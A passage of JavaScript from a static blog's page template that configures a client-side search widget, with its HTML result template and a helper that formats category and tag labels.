searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
